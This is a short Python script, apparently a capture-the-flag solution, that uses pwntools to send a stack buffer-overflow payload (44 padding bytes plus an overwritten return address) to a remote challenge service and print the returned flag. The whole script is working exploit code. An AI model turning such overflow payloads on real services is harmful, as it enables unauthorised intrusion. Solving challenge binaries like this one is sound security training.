from pwn import *

host = 'HOST_HERE'
port = PORT_HERE
padding = 'A' * 44 #Overflowing the buffer with 44 A's
eip = '\xf6\x91\x04\x08' #Will set the EIP to 0x080491f6
payload = padding + eip
connect = remote(host,port)
print('[+] Connecting...')
print('[+] Sending Payload...')
connect.sendlineafter('Please enter your string: ', payload) #Sends the payload after we recieve the string "Please enter your string"
output = connect.recvall()
print(output[65:]) #Outputting the flag
